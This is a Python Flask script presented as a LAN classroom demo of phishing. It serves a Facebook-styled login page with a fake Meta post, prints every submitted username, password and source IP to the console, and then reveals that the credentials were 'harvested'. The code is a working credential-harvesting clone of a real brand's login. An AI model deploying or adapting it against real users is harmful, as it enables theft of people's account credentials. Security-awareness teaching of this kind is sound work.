from flask import Flask, request, render_template_string, flash, redirect, url_for, session
import os
import datetime

# --- IMPORTANT SECURITY NOTICE ---
# This server is configured to listen on all interfaces (0.0.0.0) for the LAN demo.
# NEVER expose this type of server to the public internet.
# ---

app = Flask(__name__)
# Generates a random secret key for session management, required by Flask
app.secret_key = os.urandom(24) 

# --- A pretend user database (for fake successful login) ---
USERS = {
    "admin": "password123",
    "dummy": "password",
    "workshop": "demo_pass"
}

# --- HTML Templates ---

# Login Page HTML - Now uses the sophisticated social media post layout
LOGIN_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <!-- Adding Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: 'Helvetica', 'Arial', sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        /* New Header Styles */
        .main-header {
            background-color: #ffffff;
            padding: 8px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #dddfe2;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            position: fixed; /* Ensures header is always visible */
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
        }
        .header-logo h1 {
            color: #1877f2;
            font-size: 32px;
            margin: 0;
            font-weight: bold;
        }
        .login-form {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .login-form .input-group {
            display: flex;
            flex-direction: column;
        }
        .login-form label {
            font-size: 12px;
            color: #606770;
            margin-bottom: 2px;
        }
        .login-form input {
            border: 1px solid #dddfe2;
            border-radius: 6px;
            padding: 8px;
            font-size: 13px;
        }
        .login-form .btn-login {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 8px 12px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-form .forgot-link {
            font-size: 12px;
            color: #1877f2;
            text-decoration: none;
            margin-top: 16px; /* Aligns with top of inputs */
        }
        /* Main content area for the post */
        .content-area {
            display: flex;
            justify-content: center;
            padding: 20px;
            margin-top: 60px; /* Add margin to clear fixed header */
        }
        /* The main link that wraps the entire post */
        .post-link {
            text-decoration: none;
            color: inherit;
            display: block;
            width: 100%;
            max-width: 500px;
        }
        .post {
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
            transition: box-shadow 0.3s ease;
        }
        .post:hover {
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }
        .post-header {
            display: flex;
            align-items: center;
            padding: 12px 16px;
        }
        .profile-pic {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            margin-right: 12px;
        }
        .post-info {
            display: flex;
            flex-direction: column;
        }
        .user-line {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .user-name {
            font-weight: 600;
            color: #050505;
        }
        .verified-badge {
            color: #1877f2; /* Facebook blue */
            font-size: 14px;
        }
        .post-time {
            font-size: 13px;
            color: #65676b;
        }
        .post-text {
            padding: 4px 16px 16px 16px;
            font-size: 15px; /* Adjusted for longer text */
            color: #050505;
            line-height: 1.35; /* Adjusted for longer text */
            white-space: pre-wrap; /* Ensures line breaks are respected */
        }
        .hashtag {
            color: #1877f2; /* Facebook blue */
            font-weight: 500;
        }
        .post-image-container {
            line-height: 0; /* Removes space below image */
        }
        .post-image {
            width: 100%;
            height: auto;
        }
        .post-stats {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 16px;
            color: #65676b;
            font-size: 15px;
            border-bottom: 1px solid #e4e6eb;
            margin: 0 16px;
        }
        .post-stats .likes {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .post-stats .like-icon {
            background-color: #1877f2;
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }
        .post-stats .comments {
            color: #1877f2;
        }
        .post-footer {
            padding: 8px 16px;
            color: #65676b;
            font-size: 15px;
            border-top: 1px solid #e4e6eb;
            margin: 0 16px;
            display: flex;
            justify-content: space-around;
        }
        .footer-action {
             display: flex;
             align-items: center;
             gap: 8px;
             font-weight: 600;
             cursor: pointer;
        }
        .flash-message {
            padding: 0.5rem;
            margin-top: 60px; /* Aligned with content-area margin */
            border-radius: 0 0 4px 4px;
            text-align: center;
            font-size: 14px;
            width: 100%;
            max-width: 500px;
            margin: 60px auto 0;
        }
        .flash-error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .flash-success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        
        @media (max-width: 900px) {
            .main-header { flex-direction: column; align-items: flex-start; }
            .login-form { flex-direction: column; align-items: flex-start; width: 100%; }
            .login-form .input-group { width: 100%; }
            .login-form input { width: 100%; }
            .login-form .btn-login, .login-form .forgot-link { margin-top: 5px; }
            .main-header { padding: 10px; }
            .content-area { margin-top: 150px; } /* Adjust margin for mobile header */
        }
    </style>
</head>
<body>
    <header class="main-header">
        <div class="header-logo">
            <h1>facebook</h1>
        </div>
        <!-- FORM FIXED: Added method, action, and name attributes for Flask to capture data -->
        <form class="login-form" method="post" action="{{ url_for('login') }}">
            <div class="input-group">
                <label for="username">Email or phone</label>
                <input type="text" id="username" name="username"> 
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password">
            </div>
            <button type="submit" class="btn-login">Log In</button>
            <a href="#" class="forgot-link">Forgotten account?</a>
        </form>
    </header>

    <!-- FLASH MESSAGES ADDED HERE to display errors/success -->
    {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
            {% for category, message in messages %}
                <div class="flash-message flash-{{ category }}">{{ message }}</div>
            {% endfor %}
        {% endif %}
    {% endwith %}

    <main class="content-area">
        <!-- The entire post is wrapped in an anchor tag to make it clickable -->
        <!-- NOTE: The post-link is disabled in this demo to prevent accidental navigation. 
             If you want the link to work, replace '#' with a valid URL. -->
        <div class="post-link"> 
            <div class="post">
                <div class="post-header">
                    <!-- Images (meta_logo.jpg, Hashim-Amla.png) must be present in the same directory as the script -->
                    <img class="profile-pic" src="meta_logo.jpg" onerror="this.src='https://placehold.co/40x40/1877f2/ffffff?text=M'" alt="Profile Picture">
                    <div class="post-info">
                        <div class="user-line">
                           <span class="user-name">Meta</span>
                           <span class="verified-badge"><i class="fas fa-check-circle"></i></span>
                        </div>
                        <span class="post-time">October 3 at 10:19 PM &middot; <i class="fas fa-globe-americas"></i></span>
                    </div>
                </div>
                <p class="post-text">হাশিম আমলা (Hashim Amla) — দক্ষিণ আফ্রিকার এক কিংবদন্তি ক্রিকেটার, যিনি তার মার্জিত ব্যাটিং স্টাইল, নৈতিক ব্যক্তিত্ব, এবং ধারাবাহিক পারফরম্যান্সের জন্য সারা বিশ্বে সম্মানিত।
<span class="hashtag">#MetaHQVisit</span> <span class="hashtag">#Congratulations</span> <span class="hashtag">#FutureOfConnection</span> <span class="hashtag">#MetaExclusive</span></p>
                <div class="post-image-container">
                    <!-- Images (meta_logo.jpg, Hashim-Amla.png) must be present in the same directory as the script -->
                    <img class="post-image" src="Hashim-Amla.png" onerror="this.src='https://placehold.co/500x300/e9ebee/222?text=Clickable+Content+Image'" alt="Cricket player celebrating">
                </div>
                <div class="post-stats">
                    <div class="likes">
                        <span class="like-icon"><i class="fas fa-thumbs-up"></i></span>
                        <span>1.4M</span>
                    </div>
                    <div class="comments">
                        <span>564K Comments</span>
                    </div>
                </div>
                <div class="post-footer">
                    <div class="footer-action"><i class="far fa-thumbs-up"></i> Like</div>
                    <div class="footer-action"><i class="far fa-comment-alt"></i> Comment</div>
                    <div class="footer-action"><i class="far fa-share-square"></i> Share</div>
                </div>
            </div>
        </div>
    </main>
</body>
</html>
"""

# Protected Page HTML (Visible after successful login or dummy data entry)
DASHBOARD_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding-top: 50px; }
        .content { background-color: white; padding: 2rem; margin: auto; width: 80%; max-width: 600px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 4px, 6px, 0.1); }
        h1 { color: #1877f2; }
        p { font-size: 18px; }
        a { color: #1877f2; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="content">
        <h1>Welcome, {{ username }}!</h1>
        <p>You have successfully logged in, but this is a **DEMO SITE**.</p>
        <p>Your entered credentials were instantly captured by the server running on the host machine.</p>
        <p>This is how **Credential Harvesting** works. Always check the URL!</p>
        <a href="{{ url_for('logout') }}">Log Out (End Demo)</a>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    """Shows the login page."""
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    Handles the login attempt.
    Crucially, it prints the captured credentials to the console for the demo.
    """
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # --- CRITICAL DEMO STEP: Print the captured data to the server console ---
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print("="*60)
        print(f"[{timestamp} | PHISHING ALERT] Captured Credential!")
        print(f" -> Email/Username: {username}")
        print(f" -> Password: {password}")
        print(f" -> Source IP: {request.remote_addr}")
        print("="*60)
        # -----------------------------------------------------------------------

        # Although the credentials are "stolen" at this point, we still simulate a 
        # legitimate login path for a smooth user experience in the demo.
        if username in USERS and USERS[username] == password:
            session['username'] = username 
            flash('Login successful!', 'success')
            return redirect(url_for('dashboard'))
        else:
            # If the user enters credentials that don't match our dummy list, 
            # we just log them in anyway to show the success of the attack, 
            # since the credential has ALREADY been captured.
            session['username'] = username if username else 'User'
            return redirect(url_for('dashboard'))

    return redirect(url_for('index'))


@app.route('/dashboard')
def dashboard():
    """A protected route that is only visible to users who have "logged in" (or submitted data)."""
    if 'username' in session:
        return render_template_string(DASHBOARD_HTML, username=session['username'])
    
    flash('Please submit credentials to start the demo.', 'error')
    return redirect(url_for('index'))


@app.route('/logout')
def logout():
    """Logs the user out by clearing the session."""
    session.pop('username', None) 
    flash('You have been logged out. Demo ended.', 'success')
    return redirect(url_for('index'))


if __name__ == '__main__':
    # host='0.0.0.0' allows all devices on the LAN to access the server's IP address.
    # We use port 5000 (Flask default).
    print("--- Phishing Demo Server Ready ---")
    print("1. Find your computer's LAN IP address.")
    print("2. Ask students to open: http://[YOUR_IP_ADDRESS]:5000/")
    print("----------------------------------")
    app.run(host='0.0.0.0', port=5000, debug=False)
